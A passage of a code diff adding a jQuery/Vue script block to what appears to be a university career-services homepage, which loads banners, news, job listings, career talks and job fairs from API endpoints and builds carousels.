+            xjhlist:[]
+        },
+        updated:function(){
+            
+        },
+        filters: {
+            banner_src: function (obj) {
+				if(obj == null || obj=="" || obj == undefined || obj == "0"){
+					return "image/banner/banner1.png";
+				}
+				return obj+'!auto';
+            },
+        }
+    })
+
+    // 轮播图
+    http("POST", "/Schoolad/getlist", {"school_id":school_id, "cate_id":1}, function (e) {
+        vm.banners = e.data.list;
+        vm.$nextTick(function () {
+            // ---------------------------------------轮播图
+            $('.slides').slick({
+                infinite: true,
+                slidesToShow: 1,
+                slidesToScroll: 1,
+                 autoplay: 1000,
+                centerMode: true,
+                centerPadding: '0',
+                variableWidth: true,
+                asNavFor: '.txtslides',
+                prevArrow: ".scroll-text .prev",
+                nextArrow: ".scroll-text .next",
+                dots: true,
+                appendDots: ".scroll-text .point",
+                responsive: [{
+                    breakpoint: 1200,
+                    settings: {
+                        variableWidth: false
+                    }
+                }]
+            });
+            $('.txtslides').slick({
+                slidesToShow: 1,
+                slidesToScroll: 1,
+                arrows: false,
+                fade: true,
+                asNavFor: '.slides'
+            });
+        })
+    })
+
+    // 通知新闻公告
+    http("POST", "/Article/getlist", {"school_id":school_id, "cate_id":news1, "size":10, "page":1}, function (e) {
+        // console.log(e)
+        vm.newlist1 = []
+        for(var i=0;i<e.data.list.length;i++){
+            e.data.list[i]['addtime1'] = timestampToTime(e.data.list[i].addtime,1);
+            vm.newlist1.push(e.data.list[i]);
+        }
+    })
+    http("POST", "/Article/getlist", {"school_id":school_id, "cate_id":news2, "size":10, "page":1}, function (e) {
+        // console.log(e)
+        vm.newlist2 = []
+        for(var i=0;i<e.data.list.length;i++){
+            e.data.list[i]['addtime1'] = timestampToTime(e.data.list[i].addtime,1);
+            vm.newlist2.push(e.data.list[i]);
+        }
+    })
+    http("POST", "/Article/getlist", {"school_id":school_id, "cate_id":news3, "size":10, "page":1}, function (e) {
+        // console.log(e)
+        vm.newlist3 = []
+        for(var i=0;i<e.data.list.length;i++){
+            e.data.list[i]['addtime1'] = timestampToTime(e.data.list[i].addtime,1);
+            vm.newlist3.push(e.data.list[i]);
+        }
+    })
+
+    //校招公告
+    http("POST", "/enrollment/getlist", {"school_id":school_id, "type":0, "page":1, "size":11}, function (e) {
+        // console.log(e)
+        vm.xzgglist = []
+        for(var i = 0; i < e.data.list.length; i++){
+            e.data.list[i]['addtime1'] = timestampToTime(e.data.list[i].addtime,1);
+            vm.xzgglist.push(e.data.list[i]);
+        }
+    })
+
+    // 教师人才
+    http("POST", "/job/getlist", {"school_id":school_id, "cate_id1":jobtype, "jobtype":3, "isunion":2, "page":1, "size":5}, function (e) {
+        // console.log(e)
+        vm.teachers = []
+        for(var i = 0; i < e.data.list.length; i++){
+            e.data.list[i]['addtime1'] = timestampToTime(e.data.list[i].addtime,6);
+            e.data.list[i]['addtime2'] = timestampToTime(e.data.list[i].addtime,7);
+            vm.teachers.push(e.data.list[i]);
+        }
+    })
+    // 综合招聘
+    http("POST", "/job/getlist", {"school_id":school_id, "jobtype":3, "isunion":2, "page":1, "size":5}, function (e) {
+        // console.log(e)
+        vm.zhzplist = []
+        for(var i = 0; i < e.data.list.length; i++){
+            e.data.list[i]['addtime1'] = timestampToTime(e.data.list[i].addtime,6);
+            e.data.list[i]['addtime2'] = timestampToTime(e.data.list[i].addtime,7);
+            vm.zhzplist.push(e.data.list[i]);
+        }
+    })
+    
+    // 宣讲会
+    http("POST", "/preach/getlist", {"school_id":school_id, "isunion":"2", "page":1, "size":24}, function (e) {
+        // console.log(e)
+        vm.xjhlist = e.data.list
+        for(var i=0;i<e.data.list.length;i++){
+            if(i <= 3){
+                vm.xjhlist1.push(e.data.list[i]);
+            }else if(i >= 4 && i < 8){
+                vm.xjhlist2.push(e.data.list[i]);
+            }else if(i >= 12 && i < 16){
+                vm.xjhlist3.push(e.data.list[i]);
+            }else if(i >= 20 && i < 24){
+                vm.xjhlist4.push(e.data.list[i]);
+            }
+        }
+        vm.$nextTick(function () {
+            var str="<a class='col-xs-6 col-md-3'><div style='text-align: center;line-height: 178px;'>持续更新中...</div></a>";
+            if(vm.xjhlist1.length < 4 && vm.xjhlist1.length > 0){
+                for(var i=0;i<4-vm.xjhlist1.length;i++){
+                    $(".xuan_ .li1").append(str);
+                }
+            }
+            if(vm.xjhlist2.length < 4 && vm.xjhlist2.length > 0){
+                for(var i=0;i<4-vm.xjhlist2.length;i++){
+                    $(".xuan_ .li2").append(str);
+                }
+            }
+            if(vm.xjhlist3.length < 4 && vm.xjhlist3.length > 0){
+                for(var i=0;i<4-vm.xjhlist3.length;i++){
+                    $(".xuan_ .li3").append(str);
+                }
+            }
+            if(vm.xjhlist4.length < 4 && vm.xjhlist4.length > 0){
+                for(var i=0;i<4-vm.xjhlist4.length;i++){
+                    $(".xuan_ .li4").append(str);
+                }
+            }
+            function xuan_lunbo() {
+                var xuan_boxW = $(".xuan_ .xuan_box").width() + 1;
+                $(".xuan_ ul li").css("width", xuan_boxW + "px");
+                var xuan_count = $(".xuan_ ul li").size();
+                $(".xuan_ ul").css("width", xuan_boxW * (xuan_count + 1) + "px");
+                // $(".xuan_ ul a").css("width", xuan_boxW / 3 + "px");
+            }
+            // var youxiao = []
+            // // console.log(vm.xjhlist[i].timestatus)
+            // for(var i=0;i<vm.xjhlist.length;i++){
+            //     if(vm.xjhlist[i]['timestatus'] == "1"||vm.xjhlist[i]['timestatus'] == "2"){
+            //         youxiao.push(vm.xjhlist[i])
+            //         console.log(vm.xjhlist[i]['timestatus'])
+            //         $(".xuan_>div").xuanlunbo(true);
+            //     }
+            // }
+            // if(youxiao.length){
+            //     console.log(youxiao.length)
+            //     $(".xuan_>div").xuanlunbo(true);
+            // }
+            // for(var i=0;i<youxiao.length;i++){
+            //     if(i>4){
+            //         $(".xuan_>div").xuanlunbo(true);
+            //         console.log(i)
+            //     }
+            // }
+            xuan_lunbo();
+            $(window).resize(function () {
+                // if(youxiao.length){
+                    // $(".xuan_>div").xuanlunbo(true);
+                // }
+            })
+             $(".xuan_>div").xuanlunbo(true);
+
+            $(".xuan_box>ul>li>a").hover(function(){
+                $(this).find("h4").animate({"font-size":"16px"});
+                $(this).find(".dd,.dd span").css("color","#178BD9");
+                $(this).find(".qiye,.qiye span").css("color","#178BD9");
+            },function(){
+                $(this).find("h4").animate({"font-size":"14px"});
+                $(this).find(".dd,.dd span").css("color","#000");
+                $(this).find(".qiye,.qiye span").css("color","#000");
+            })
+        })
+    })
+
+    // 双选会
+    http("POST", "/jobfair/getlist", {"school_id":school_id, "page":1, "size":24, "status":0}, function(e){
+        // console.log(e)
+        for(var i=0;i<e.data.list.length;i++){
+            e.data.list[i]['start_time1'] = timestampToTime(e.data.list[i].start_time,1)
+            if(i <= 3){
+                vm.sxhlist1.push(e.data.list[i]);
+            }else if(i >= 4 && i < 8){
+                vm.sxhlist2.push(e.data.list[i]);
+            }else if(i >= 12 && i < 16){
+                vm.sxhlist3.push(e.data.list[i]);
+            }else if(i >= 20 && i < 24){
+                vm.sxhlist4.push(e.data.list[i]);
+            }
+        }
+        vm.$nextTick(function () {
+            var str="<a class='col-xs-6 col-md-3'><div style='text-align: center;line-height: 178px;'>持续更新中...</div></a>";
+            if(vm.sxhlist1.length < 4 && vm.sxhlist1.length > 0){
+                for(var i=0;i<4-vm.sxhlist1.length;i++){
+                    $(".sxhui_ .li1").append(str);
+                }
+            }
+            if(vm.sxhlist2.length < 4 && vm.sxhlist2.length > 0){
+                for(var i=0;i<4-vm.sxhlist2.length;i++){
+                    $(".sxhui_ .li2").append(str);
+                }
+            }
+            if(vm.sxhlist3.length < 4 && vm.sxhlist3.length > 0){
+                for(var i=0;i<4-vm.sxhlist3.length;i++){
+                    $(".sxhui_ .li3").append(str);
+                }
+            }
+            if(vm.sxhlist4.length < 4 && vm.sxhlist4.length > 0){
+                for(var i=0;i<4-vm.sxhlist4.length;i++){
+                    $(".sxhui_ .li4").append(str);
+                }
+            }
+            function sxhui_lunbo() {
+                var sxhui_boxW = $(".sxhui_ .sxhui_box").width() + 1;
+                $(".sxhui_ ul li").css("width", sxhui_boxW + "px");
+                var sxhui_count = $(".sxhui_ ul li").size();
+                $(".sxhui_ ul").css("width", sxhui_boxW * (sxhui_count + 1) + "px");
+                // $(".sxhui_ ul a").css("width", sxhui_boxW / 3 + "px");
+            }
+            sxhui_lunbo();
+            $(window).resize(function () {
+                sxhui_lunbo();
+            })
+            $(".sxhui_>div").sxhuuilunbo(true);
+
+            $(".sxhui_box>ul>li>a").hover(function(){
+                $(this).find("h4").animate({"font-size":"16px"});
+                $(this).find(".dd,.dd span").css("color","#178BD9");
+                $(this).find(".qiye,.qiye span").css("color","#178BD9");
+            },function(){
+                $(this).find("h4").animate({"font-size":"14px"});
+                $(this).find(".dd,.dd span").css("color","#000");
+                $(this).find(".qiye,.qiye span").css("color","#000");
+            })
+        })
+    })
+   
+    // 悬浮窗
+    http("POST", "/School/detail", {"id":school_id}, function (e) {
+        // console.log(e)
+        vm.piaoc = e.data;
+        // vm.$nextTick(function () {
+        //     $(".automv").css({"width":e.data.open_float_width,"height":e.data.open_float_height});
+        // })
+    })
+
+    //iframe
+
+    $('.openiframe').click(function(){
+        $('#cnuModal').modal("show");
+       
+
+         //$(x).css("display","none")
+        return false
+    })
+    // $('#iframe').load(function () {
+    //     var _ifram = document.getElementById('iframe')
+    //      var x =  _ifram[0].contentDocument||_ifram[0].contentWindow.document;
+    //         console.log(x)
+       
+    //     });
+    $(document).ready(function(){
+        var wxpage = sessionStorage.getItem("wx");//生源信息 全局变量
+        var phone = sessionStorage.getItem("phone");//生源信息 全局变量
+        if(wxpage=='false' && phone=='true'){
+            $('.wxb').html('<a href="http://w.jiuyeb.cn/index.html?wxappid=wx4193d75b3d245a87" class="wxblian">查看微信版</a>')
+        }
+    })
+</script>
+
+<script>
+    
+// $(function(){
+//     var mobile_flag = isMobile(); // true为手机端，false为PC端
+
+//     if(mobile_flag){
+//         $("#fh5co-main").css({"width": "100%", "float": "right"});
+//         $("#trademark").css({"margin-left": "48px","margin-top": "16px"});
+//     }
+// });
+
+// function isMobile() {
+//     var userAgentInfo = navigator.userAgent;
+
+//     var mobileAgents = [ "Android", "iPhone", "SymbianOS", "Windows Phone", "iPad","iPod"];
+
+//     var mobile_flag = false;
+
+//     //根据userAgent判断是否是手机
+//     for (var v = 0; v < mobileAgents.length; v++) {
+//         if (userAgentInfo.indexOf(mobileAgents[v]) > 0) {
+//             mobile_flag = true;
+//             break;
+//         }
+//     }
+
+//     var screen_width = window.screen.width;
+//     var screen_height = window.screen.height;    
+
+//     //根据屏幕分辨率判断是否是手机
+//     if(screen_width < 500 && screen_height < 800){
+//         mobile_flag = true;
+//     }
+
+//     return mobile_flag;
+// }
+
+</script>
